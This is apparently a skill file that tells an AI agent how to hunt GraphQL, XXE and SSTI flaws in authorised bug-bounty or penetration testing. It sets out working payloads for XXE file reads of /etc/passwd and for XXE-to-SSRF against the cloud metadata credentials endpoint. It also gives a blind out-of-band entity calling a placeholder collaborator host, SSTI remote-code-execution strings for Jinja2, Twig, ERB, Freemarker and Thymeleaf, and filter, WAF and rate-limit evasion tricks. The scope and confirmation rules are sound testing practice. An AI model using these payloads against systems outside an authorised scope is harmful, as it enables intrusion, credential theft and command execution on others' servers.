---
name: hunt-injection
description: GraphQL IDOR/auth-bypass, XXE file-read/SSRF (SVG/DOCX/SAML), SSTI detection and RCE. OOB-mandatory for blind XXE. Wiki-first, FIND schema output.
---

# Hunt: GraphQL / XXE / SSTI

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration limits, stop conditions, wiki protocol, FIND output, and Deadends. Do not re-derive any of that here.

## Wiki

```
qmd_query "SSTI XXE GraphQL injection template injection XML external entity" via wiki-search MCP
```

Hub: [[web-moc]] (live web index). Primary page: [[ssti]]. Payload arsenals: `wiki/payloads/{ssti,xxe,graphql,xslt}.md`.
Anchors: [[xxe]], [[graphql-attacks]], [[xslt-injection]] (server-side XSLT injection, payloads [[xslt]]).

---

## GRAPHQL

### Signals
```
/graphql  /api/graphql  /v1/graphql  /query  /gql
POST requests with {"query": "..."} body in Burp history
"apollo", "ApolloClient", "gql`" in JS bundles
```

### Methodology
1. Test introspection:
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
```
If blocked, try: `{"query":"{ __typename }"}`

2. Use InQL (Burp extension) or graphql-voyager to map schema. Push load-bearing queries/mutations to **Burp Repeater** (`Skill(hunt-burp)` / the Burp MCP) so the operator can replay them.
3. Find REST/GraphQL overlap - resources modifiable via BOTH APIs
4. Test IDOR: replay queries/mutations with another user's object IDs
5. Test authorization: lower-privilege user calling admin mutations
6. Test for persistent privilege after REST revokes access - GraphQL re-grants?

### Evasion
Introspection disabled -> `{"query":"{ __typename }"}` confirms GraphQL is live; then field-suggestion mining (typo a field, the error often names valid ones), alias-based enumeration for parallel object access, and query batching (array body) to bypass per-request rate limits and some auth checks.

---

## XXE

### Attack Surface (ranked)
```
/upload  /import  /parse  /convert  /saml/acs  /soap/*
Content-Type: application/xml or text/xml
SVG, DOCX, XLSX, PPTX file upload features
```
Rank: SAML ACS and document/office upload converters first (parsers there routinely resolve external entities), then any endpoint you can flip to `Content-Type: application/xml`.

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

### Blind OOB (when no reflection)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_COLLAB/xxe?x="> %xxe;
]>
<root>test</root>
```

### SVG Upload XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### XXE -> SSRF
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

### Evasion
XML/DTD rejected -> switch vector (SVG/DOCX/XLSX/PPTX upload, or a `Content-Type: application/xml` swap on a JSON endpoint), UTF-16/UTF-7 re-encode the payload, wrap the leaked file through `php://filter/convert.base64-encode/resource=` for binary/PHP source, and use parameter entities + an external DTD when the inline DOCTYPE is blocked.

---

## SSTI

### Detection Probes (try all - different engines respond to different syntax)
```
{{7*7}}      -> 49 = Jinja2 / Twig
${7*7}       -> 49 = Freemarker / Velocity / SpEL
<%= 7*7 %>   -> 49 = ERB (Ruby)
#{7*7}       -> 49 = Mako
*{7*7}       -> 49 = Spring Thymeleaf
{{7*'7'}}    -> 7777777 = Jinja2 (not Twig)
```

### RCE Payloads (after fingerprinting engine)
```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= `id` %>

# Freemarker
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}

# Spring Thymeleaf SpEL
*{T(java.lang.Runtime).getRuntime().exec('id')}
```
Prove RCE with a harmless command (`id` / `whoami`) first - as the payloads above do. Never lead with a destructive command to demonstrate execution.

### Where to Test (ranked)
Highest yield first: PDF/invoice generators and email-template fields (server-side render by design), then name/bio/description fields, invoice names, search queries reflected in results, URL path parameters, and HTTP headers reflected in responses.

### Evasion
`{{7*7}}` filtered or returned literally -> cycle every engine syntax above, then bypass keyword filters via attribute-access variants (`request["application"]` vs `request.application`), string concatenation to rebuild blocked names, and hex/unicode escapes. WAF on `__class__` -> `|attr('__class__')`.

---

## Chaining
- **SSTI -> RCE.** Evaluation confirmed -> escalate to command execution with the engine payload above (safe command first). For sandbox-escape gadget chains and OOB-blind RCE, hand off to `hunt-rce`.
- **XXE -> SSRF / file read.** Point the external entity at `http://169.254.169.254/...` for cloud metadata or an internal service; for the full SSRF surface (redirect bypass, protocol smuggling, Collaborator-gated blind) hand off to `hunt-ssrf`. File read escalates to source/config disclosure and, through those, to further creds.
- **GraphQL IDOR / auth bypass -> object enumeration.** Nested-resolver and `node(id:)` traversal are IDOR - hand off to `hunt-idor` (two-account method) or `hunt-api` (BOLA/BFLA, mass assignment, batching).

## Confirmation gate

Per `hunt-core`. Reproduce every claim in a clean session before scaffolding a FIND; a response body on its own is not proof.

**SSTI - NOT confirmation:** a `{{7*7}}` (or `${7*7}` / `<%= 7*7 %>`) reflected back *literally* as `{{7*7}}`; an error naming the template engine; input echoed unchanged.
**SSTI - IS confirmation:** the expression is *evaluated* - `{{7*7}}` renders `49`, `{{7*'7'}}` renders `7777777`, or a rendered object comes back (e.g. a dumped `config` object). RCE is confirmed only when a safe command (`id` / `whoami`) returns its real output.

**XXE - NOT confirmation:** a parser error, a `500`, or "entity not allowed" - these prove XML is parsed, not that the entity resolved.
**XXE - IS confirmation:** the external entity resolves to real content - `/etc/passwd` (or metadata creds) reflected in the response, OR an out-of-band callback.

**Blind XXE / blind SSTI need an OOB HIT.** When you plant a blind/OOB payload (parameter-entity XXE, or SSTI with no reflected sink), fire it at your own interactsh/Collaborator listener and append a row to `targets/<eng>/oob.md`:
```
| <token> | <sink url+param> | xxe | <date> | waiting | |
```
(columns: token | sink | class | planted | status | source; token = your unique interactsh/Collaborator label). The recon-capture hook flips the row waiting -> HIT on the incoming callback and SessionStart surfaces HITs; that HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind XXE (or blind SSTI) without a HIT row.

## Severity

| Confirmed | Severity |
|---|---|
| SSTI -> RCE | critical |
| SSTI, sandboxed (no RCE) | medium |
| XXE file read | high (critical if cloud-metadata creds retrieved) |
| XXE -> SSRF | high |
| GraphQL IDOR / auth bypass | high |

**Distill when confirmed** (GENERIC, no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/ssti.md` (XXE -> `techniques/web/xxe.md`; GraphQL -> `techniques/web/graphql-attacks.md`).

## Deadends

```
Append: - [ ] XXE on <host> -- XML rejected (JSON-only), SVG sanitized, parameter entities blocked;
              SSTI -- {{7*7}} literal across all engines; GraphQL -- introspection off, no field suggestions
```

Record what you tried, not just that it failed. The next pass needs the boundary.
